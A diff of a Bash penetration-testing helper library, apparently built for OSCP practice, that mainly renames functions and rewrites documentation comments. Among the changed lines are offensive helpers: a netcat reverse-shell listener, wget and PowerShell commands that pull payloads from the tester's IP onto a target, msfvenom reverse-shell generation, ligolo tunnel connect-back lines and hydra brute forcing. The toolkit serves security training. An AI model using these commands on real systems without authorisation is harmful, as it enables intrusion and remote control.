@@ -5,15 +5,15 @@ source $HOME/oscp-swiss/script/utils.sh
 source $HOME/oscp-swiss/script/alias.sh
 source $HOME/oscp-swiss/script/extension.sh
 
-load_settings
-load_private_scripts
+_load_settings
+_load_private_scripts
 
 # Description: List all functions, aliases, and variables
 # Usage: swiss
-# Category: [ func:memorize, func:shortcut ]
 # swiss -f <function name>
 # swiss -c "category"
 # swiss -h
+# Category: [ ]
 function swiss() {
     _banner() {
         swiss_logger info ".--------------------------------------------."
@@ -33,7 +33,6 @@ function swiss() {
         _banner
     fi
 
-
     swiss_logger info "[i] Functions:"
     {
         grep -E '^\s*function\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\(\)\s*\{' "$swiss_script" | sed -E 's/^\s*function\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\(\)\s*\{/\1/';
@@ -46,7 +45,6 @@ function swiss() {
         grep -E '^\s*alias\s+' "$swiss_alias" | sed -E 's/^\s*alias\s+([a-zA-Z_][a-zA-Z0-9_]*)=.*/\1/';
     } | sort | column
     
-
     swiss_logger info "[i] Variables:"
     {
         grep -E '^\s*[a-zA-Z_][a-zA-Z0-9_]*=' "$swiss_extension" | sed -E 's/^\s*([a-zA-Z_][a-zA-Z0-9_]*)=.*/\1/';
@@ -80,6 +78,7 @@ function swiss() {
     fi
 }
 
+# TODO: deprecate
 function find_category() {
     if [[ "$1" == "-h" ]]; then
 
@@ -204,11 +203,21 @@ function find_category() {
     done
 }
 
+# Description: 
+#   Simplified version of the `ip a` command to show the IP address of the default network interface.
+#   The default network interface's IP address is copied to the clipboard.
+# Usage: i
+# Category: [ ]
+function i() {
+    ip -o -f inet addr show | awk '{printf "%-6s: %s\n", $2, $4}'
+    ip -o -f inet addr show | grep $_swiss_default_network_interface | awk '{split($4, a, "/"); printf "%s", a[1]}' | xclip -selection clipboard
+}
+
 # Description: Wrapped nmap command with default options
 # Usage: nmap_default <IP> [mode]
 # Modes: fast (default), tcp, udp, udp-all, stealth
 # Example: nmap_default 192.168.1.1
-# Category: [ func:recon, target:linux, target:windows ]
+# Category: [ recon ]
 function nmap_default() {
     local ip=""
     local mode=${2:-"tcp"}
@@ -292,7 +301,7 @@ function nmap_default() {
 # Example:
 #   svc http # to spawn a http server in the current directory
 #   svc ftp  # to spawn a ftp server in the current directory
-# Category: [ func:recon, func:pe, func:shortcut ]
+# Category: [ recon, pe ]
 function svc() {
     local service=""
 
@@ -321,7 +330,7 @@ function svc() {
             swiss_logger info "usage:"
             swiss_logger info "\t(1) run ftp"
             swiss_logger info "\t(2) run open <ip> 21"
-            swiss_logger info "\t(2-2) Default Interface ($_swiss_default_network_interface) IP: $(get_default_network_interface_ip)"
+            swiss_logger info "\t(2-2) Default Interface ($_swiss_default_network_interface) IP: $(_get_default_network_interface_ip)"
             swiss_logger info "\t(3) use username anonymous"
             swiss_logger info "\t(4) binary # use binary mode"
             swiss_logger info "\t(5) put <file-you-want-to-download>"
@@ -354,7 +363,7 @@ function svc() {
             sudo neo4j console
             ;;
         bloodhound-ce)
-            extension_fn_banner
+            _extension_fn_banner
             # ref: https://support.bloodhoundenterprise.io/hc/en-us/articles/17468450058267-Install-BloodHound-Community-Edition-with-Docker-Compose
             swiss_logger info "[i] start BloodHound CE (v2.4.1) ..."
             swiss_logger info "[i] start port check on 8080"
@@ -374,13 +383,13 @@ function svc() {
             sudo docker-compose up
             ;;
         ligolo)
-            extension_fn_banner
+            _extension_fn_banner
             swiss_logger info "[i] start ligolo agent"
             swiss_logger warn "[w] one-time setup: sudo ip tuntap add user $(whoami) mode tun ligolo; sudo ip link set ligolo up"
             swiss_logger info "[i] under target (find agent executable under \$ligolo_path):"
-            swiss_logger info "[i] agent.exe -connect $(get_default_network_interface_ip):443 -ignore-cert"
+            swiss_logger info "[i] agent.exe -connect $(_get_default_network_interface_ip):443 -ignore-cert"
             swiss_logger warn "[w] Using fingerprint: "
-            swiss_logger warn "[w] agent.exe -connect $(get_default_network_interface_ip):443 -accept-fingerprint [selfcert-value]"
+            swiss_logger warn "[w] agent.exe -connect $(_get_default_network_interface_ip):443 -accept-fingerprint [selfcert-value]"
 
             swiss_logger info "[i] after connection: "
             swiss_logger info "[i] > session                                    # choose the session"
@@ -393,14 +402,14 @@ function svc() {
             $ligolo_agent_path -selfcert -laddr 0.0.0.0:443
             ;;
         wsgi)
-            extension_fn_banner
+            _extension_fn_banner
             swiss_logger info "[i] start wsgidav under the directory: $(pwd)"
             swiss_logger info "[i] port used: 80"
             i
             $_swiss_svc_wsgi --host=0.0.0.0 --port=$_swiss_svc_wsgi_default_port --auth=anonymous --root .
             ;;
         python-venv)
-            extension_fn_banner
+            _extension_fn_banner
             python3 -m venv .venv
             source .venv/bin/activate
             ;;
@@ -419,7 +428,7 @@ function svc() {
 # Example:
 #   ship ./rce.sh
 #   ship -t windows ./rce.exe
-# Category: [ func:rce, func:pe, target:windows, target:linux ]
+# Category: [ rce, pe, file-transfer ]
 function ship() {
     local type="linux"
     local autoHostHttp=true
@@ -471,9 +480,9 @@ function ship() {
 
         local cmd
         if [[ "$type" == "linux" ]]; then
-            cmd="wget $(get_default_network_interface_ip)/$filename"
+            cmd="wget $(_get_default_network_interface_ip)/$filename"
         elif [[ "$type" == "windows" ]]; then
-            cmd="powershell -c \"Invoke-WebRequest -Uri 'http://$(get_default_network_interface_ip)/$filename' -OutFile C:/ProgramData/$filename\""
+            cmd="powershell -c \"Invoke-WebRequest -Uri 'http://$(_get_default_network_interface_ip)/$filename' -OutFile C:/ProgramData/$filename\""
         else
             log error "[e] Unknown type '$type'."
             return 1
@@ -497,13 +506,11 @@ function ship() {
     # TODO: remove the copied files automatically with global conf
 }
 
-
-
 # Description:
 #   One-liner to start a reverse shell listener,
 #   warpped with rlwrap to make the reverse shell interactive
 # Usage: listen <port>
-# Category: [func:rce, target:windows, target:linux]
+# Category: [ rce ]
 function listen() {
     i
     rlwrap nc -lvnp $1
@@ -517,17 +524,18 @@ function listen() {
 #   -i|--ip: IP address for the reverse shell
 # Example:
 #  windows_rev -p 4444 -a x86 -i
-# Category: [func:rce,target:windows]
-# Ref: https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
-# Ref: https://github.com/rodolfomarianocy/OSCP-Tricks-2023/blob/main/shell_and_some_payloads.md
-# Todo: extends to Linux
+# Category: [ rce, windows]
+# References:
+#   - https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
+#   - https://github.com/rodolfomarianocy/OSCP-Tricks-2023/blob/main/shell_and_some_payloads.md
+# TODO: extends to Linux
 function windows_rev() {
     _helper() {
         swiss_logger info "[i] generating windows rev exe using msfvenom"
         swiss_logger info "Usage: gen_win_rev_exe <-a, --arch x86|x64|dll> [<-i, --ip IP] [-p, --port PORT]"
     }
 
-    local ip=$(get_default_network_interface_ip)
+    local ip=$(_get_default_network_interface_ip)
     local port="$_swiss_windows_rev_default_port"
     local arch
     local generate_stage=$_swiss_windows_rev_generate_stage
@@ -595,7 +603,7 @@ function windows_rev() {
 # Description: directory fuzzing using fuff, compatible with original arguments
 # Usage: ffuf_default [URL/FUZZ] (options)
 # Example: ffuf_default http://example.com/FUZZ -fc 400
-# Category: [ func:recon,target:http ]
+# Category: [ recon, http ]
 function ffuf_default() {
 
     _helper() {
@@ -621,14 +629,14 @@ function ffuf_default() {
 
         if [[ -f "$_swiss_ffuf_default_wordlist.statistic" ]]; then
             swiss_logger warn "====== Wordlist Statistic ======"
-            _cat $_swiss_ffuf_default_wordlist.statistic
+            \cat $_swiss_ffuf_default_wordlist.statistic
             swiss_logger warn "================================"
         fi
 
         local stripped_url="${url/FUZZ/}"
 
         if [ $_swiss_ffuf_default_use_dirsearch = true ]; then
-            if check_cmd_exist dirsearch; then
+            if _check_cmd_exist dirsearch; then
                 swiss_logger info "[i] (Extension) dirsearch quick scan"
                 dirsearch -u $stripped_url
             else
@@ -643,7 +651,7 @@ function ffuf_default() {
 # Description: file traversal fuzzing using ffuf, compatible with original arguments
 # Usage: ffuf_traversal [URL] (options)
 # Example: ffuf_traversal http://example.com -fc 400
-# Category: [ func:recon,target:http ]
+# Category: [ recon, http ]
 function ffuf_traversal_default() {
     _helper() {
         swiss_logger info "Usage: ffuf_traversal_default [URL] (options)"
@@ -665,7 +673,7 @@ function ffuf_traversal_default() {
 
         if [[ -f "$_swiss_ffuf_traversal_default_wordlist.statistic" ]]; then
             swiss_logger warn "====== Wordlist Statistic ======"
-            _cat $_swiss_ffuf_traversal_default_wordlist.statistic
+            \cat $_swiss_ffuf_traversal_default_wordlist.statistic
             swiss_logger warn "================================"
         fi
 
@@ -676,7 +684,7 @@ function ffuf_traversal_default() {
 # Description: subdomain fuzzing using gobuster, compatible with original arguments
 # Usage: gobuster_subdomain_default [domain_name] (options)
 # Example: gobuster_subdomain_default example.com
-# Category: [ func:recon,target:http ]
+# Category: [ recon, http ]
 function gobuster_subdomain_default() {
     _helper() {
         swiss_logger info "Usage: gobuster_subdomain_default [domain_name] (options)"
@@ -697,7 +705,7 @@ function gobuster_subdomain_default() {
 
         if [[ -f "$_swiss_gobuster_subdomain_default_wordlist.statistic" ]]; then
             swiss_logger warn "====== Wordlist Statistic ======"
-            _cat $_swiss_gobuster_subdomain_default_wordlist.statistic
+            \cat $_swiss_gobuster_subdomain_default_wordlist.statistic
             swiss_logger warn "================================"
         fi
 
@@ -711,7 +719,7 @@ function gobuster_subdomain_default() {
 #   - ip: IP address
 #   - domain: Domain name (e.g., example.com)
 # Example: gobuster_vhost_default
-# Category: [ func:recon,target:http ]
+# Category: [ recon, http ]
 function gobuster_vhost_default() {
     _helper() {
         swiss_logger info "Usage: gobuster_vhost_default [ip] [domain] (options)"
@@ -729,7 +737,7 @@ function gobuster_vhost_default() {
 
         if [[ -f "$_swiss_gobuster_vhost_default_wordlist.statistic" ]]; then
             swiss_logger warn "====== Wordlist Statistic ======"
-            _cat $_swiss_gobuster_vhost_default_wordlist.statistic
+            \cat $_swiss_gobuster_vhost_default_wordlist.statistic
             swiss_logger warn "================================"
         fi
 
@@ -742,7 +750,7 @@ function gobuster_vhost_default() {
 # Description: hydra default
 # Usage: hydra_default <IP> <PORTS>
 # Example: hydra_default
-# Category: [ func:recon:brute-force,target:ftp, target:ssh ]
+# Category: [ recon, brute-force, ftp, ssh ]
 function hydra_default() {
     local IP=$1
     local PORTS=$2
@@ -775,7 +783,7 @@ function hydra_default() {
 
 # Description: get all urls from a web page
 # Usage: get_web_pagelink <url>
-# Category: [ func:recon,target:http ]
+# Category: [ recon, http ]
 function get_web_pagelink() {
     swiss_logger info "[i] start extracting all urls from $1"
     swiss_logger info "[i] original files will be stored at $PWD/links.txt"
@@ -787,7 +795,7 @@ function get_web_pagelink() {
 
 # Description: get keywords from a web page
 # Usage: get_web_keywords <url>
-# Category: [ func:recon,target:http ]
+# Category: [ recon, http ]
 function get_web_keywords() {
     swiss_logger info "Usage: get_web_keywords <url>"
     cewl -d $_swiss_get_web_keywords_depth -m $_swiss_get_web_keywords_min_word_length -w cewl-wordlist.txt $1
@@ -819,16 +827,16 @@ function get_web_keywords() {
 #   $ check user             # list user information
 #   $ check 3                # list suid permission
 #   $ check 14 funny-content # search file content with 'funny-content' under the current directory
-# Category: [ func:pe, func:shortcut, func:memorize ]
+# Category: [ pe, recon, linux ]
 function cp_target_script() {
     swiss_logger info "Usage: cp_target_script"
     local shell_path="$swiss_root/script/target-enum-script.sh"
     local new_file_path="$mktemp.sh"
-    _cat $shell_path > $new_file_path
+    \cat $shell_path > $new_file_path
     echo "" >> $new_file_path
-    echo "host='$(get_default_network_interface_ip)'" >> $new_file_path
+    echo "host='$(_get_default_network_interface_ip)'" >> $new_file_path
     echo "clear" >> $new_file_path
-    _cat $new_file_path | xclip -selection clipboard
+    \cat $new_file_path | xclip -selection clipboard
     rm $new_file_path
 }
 
@@ -839,7 +847,7 @@ function cp_target_script() {
 #  -i, --interface: Network interface to listen on (default: tun0)
 # Example:
 #   listen_target 192.168.1.2 # listen on traffic from/to 192.168.1.2 on the default network interface
-# Category: [ func:recon, func:pe, target:windows, target:linux ]
+# Category: [ recon, pe ]
 function listen_target() {
     swiss_logger info "[i] tcpdump to listen on traffic from/to an IP address"
     swiss_logger info "Usage: listen_target <ip> [-i <interface> | --interface <interface>]"
@@ -873,7 +881,7 @@ function listen_target() {
 #   The  function is configured by the environment variable _swiss_spawn_session_in_workspace_start_at_new_session
 #   See settings.json for more details.
 # Usage: spawn_session_in_workspace
-# Category: [ func:shortcut ]
+# Category: [ ]
 function spawn_session_in_workspace() {
     if [ "$_swiss_spawn_session_in_workspace_start_at_new_session" = true ]; then
         go_workspace
@@ -892,7 +900,7 @@ function spawn_session_in_workspace() {
 #         /usr/share/wordlists/seclists/Discovery/DNS/fierce-hostlist.txt \
 #         /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
 #         -o subdomain+vhost-default.txt
-# Category: [ func:plan ]
+# Category: [ prep, brute-force ]
 function merge() {
     local output="merged.txt"
     local statistic=true
@@ -963,12 +971,16 @@ function merge() {
     [[ "$statistic" == true ]] && swiss_logger info "[i] Statistics saved to $stat_file"
 }
 
-# TODO: Doc
-# Description:
-# Usage:
+# Description: dump files from FTP or SMB service
+# Usage: dump <service name> <ip> [service options]
 # Arguments:
+#   - service name: ftp, smb
+#   - ip: IP address of the target machine
 # Example:
-# Category: 
+#   dump ftp $target_ip -u username -p password
+#   dump smb $target_ip -s share
+# Category: [ ftp, smb, file-transfer ]
+# TODO: optimize the logic using flags
 function dump() { 
     _help() {
         swiss_logger info "Usage: dump <service name> <ip> [service options]"
@@ -1042,33 +1054,36 @@ function dump() {
 
 # Description: lookup an IP address's public information
 # Usage: target_ipinfo <ip>
-# Category: [ func:recon, type:network ]
+# Category: [ recon, network ]
+# TODO: input validation
 function target_ipinfo() {
   curl https://ipinfo.io/$1/json
 }
 
 # Description: lookup the public IP address of the host
 # Usage: host_public_ip
-# Category: [ func:recon, type:network ]
+# Category: [ network ]
 function host_public_ip() {
     curl ipinfo.io/ip
 }
 
-# Usage: rev_shell
-# TODO: Doc
-# TODO: built-in encode
-# TODO: env default port
-# Category: [ func:memorize ]
-cheatsheet() {
+# Description:
+#   function `cheatsheet` display a list of your cheatsheet files 
+#   and allow you to select one to view its contents.
+#   This can be useful for quick reference to common commands or syntax.
+#   Path of your cheatsheet files is defined in the `cheatsheet_dir` variable.
+#   Only support for .md files.
+# Usage: cheatsheet
+# Category: [ ]
+# TODO: configurable cheatsheet directory
+function cheatsheet() {
     local cheatsheet_dir="$HOME/oscp-swiss/doc/cheatsheet"
     local files=()
     local original_files=()
 
-    for file in "$cheatsheet_dir"/*.md; do
-    
+    for file in "$cheatsheet_dir"/*.md; do    
         if [[ -f "$file" ]]; then
             original_files+=("$file")
-
             # Format filename for display: remove leading number, replace dashes with spaces, capitalize
             formatted_name=$(basename "$file" .md | sed 's/^[0-9]*-//' | sed 's/-/ /g' | awk '{for(i=1;i<=NF;i++) $i=toupper(substr($i,1,1)) substr($i,2)}1')
             files+=("$formatted_name")
@@ -1086,7 +1101,6 @@ cheatsheet() {
         swiss_logger info "$((i)). ${files[$i]}"
     done
 
-    # TODO: fix newline issue
     swiss_logger prompt "[i] Select a cheatsheet by number: \c"
     read choice
 
@@ -1105,11 +1119,11 @@ cheatsheet() {
 # TODO: env default port
 # TODO: list options for shell type
 # TODO: fix revshell issue on 42 (Powershell base64)
-# Category: [ func:shortcut, func:rce, func:memorize ]
+# Category: [ rce ]
 function rev_shell() {
-    swiss_logger prompt "[i] Enter IP (Default: $(get_default_network_interface_ip)): \c"
+    swiss_logger prompt "[i] Enter IP (Default: $(_get_default_network_interface_ip)): \c"
     read -r IP
-    local IP=${IP:-$(get_default_network_interface_ip)}
+    local IP=${IP:-$(_get_default_network_interface_ip)}
 
     swiss_logger prompt "[i] Port (Default: 9000): \c"
     read -r PORT
@@ -1171,7 +1185,7 @@ function rev_shell() {
 }
 
 # TODO: Doc
-# Category: [ target:http ]
+# Category: [ http ]
 function url_encode() {
     local string="${1}"
     printf '%s' "${string}" | jq -sRr @uri
@@ -1184,10 +1198,12 @@ function url_decode() {
     printf '%s' "$string" | perl -MURI::Escape -ne 'print uri_unescape($_)'
 }
 
+# TODO: Doc
 function atob() {
     echo -n "$1" | base64 --decode
 }
 
+# TODO: Doc
 function btoa() {
     echo -n "$1" | base64
 }
@@ -1484,7 +1500,7 @@ function memory() {
 }
 
 # TODO: Doc
-# Category: [ func:shortcut ]
+# Category: [ ]
 function shortcut() {
     local file_path
     local name
@@ -1545,8 +1561,9 @@ function shortcut() {
     swiss_logger info "[i] Variable $name for $file_path has been added to $type."
 }
 
-# TODO: Doc
-# Category: [ func:check ]
+# Description: function to check all predefined shortcuts under the extension.sh
+# Usage: check_extension
+# Category: [ prep ]
 function check_extension() {
     local alias_file="$swiss_extension"
     while IFS= read -r line; do
@@ -1591,7 +1608,7 @@ function go_workspace() {
 # #       - Set the target IP address, you can use get_target to copy the target IP address to the clipboard
 # #       - Copy the ip to the clipboard
 # # Usage: init_workspace
-# # Category: [ func:shortcut, func:plan ]
+# # Category: [ prep ]
 function init_workspace() {
     local name=""
     local ip=""
@@ -1631,9 +1648,9 @@ function init_workspace() {
     set_workspace $PWD $ip
 }
 
-# Description: set the current path as workspace (cross-session)
-# Usage: set_workspace
-# Category: [ func:shortcut ]
+# Description: set the workspace path and target
+# Usage: set_workspace <workspace_path> <workspace_target>
+# Category: [ ]
 function set_workspace() {
     local workspace_path="$1"
     local workspace_target="$2"
@@ -1665,6 +1682,9 @@ function set_workspace() {
     target="$workspace_target"
 }
 
+# Description: select a workspace from the list
+# Usage: select_workspace
+# Category: [ ]
 function select_workspace() {
     if [ "$_swiss_workspace_auto_cleanup" = true ]; then     
         check_workspace
@@ -1700,6 +1720,8 @@ function select_workspace() {
 }
 
 # Description: check all workspaces' paths are exist. If a workspace does not exist, it will be removed automatically
+# Usage: check_workspace
+# Category: [ ]
 function check_workspace() {
     local updated_list=()
 
@@ -1723,9 +1745,11 @@ function check_workspace() {
     fi
 }
 
-# # Description: get the target IP address and copy it to the clipboard.
-# # Usage: get_target
-# # Category: [ func:memorize, func:shortcut ]
+# Description:
+#   - get the target IP address and copy it to the clipboard.
+#   - set the variable `target` to the target IP address
+# Usage: get_target
+# Category: [ ]
 function get_target() {
     cur_target=$(jq -r '.swiss_variable.workspace.cur.target // ""' "$swiss_settings")
 
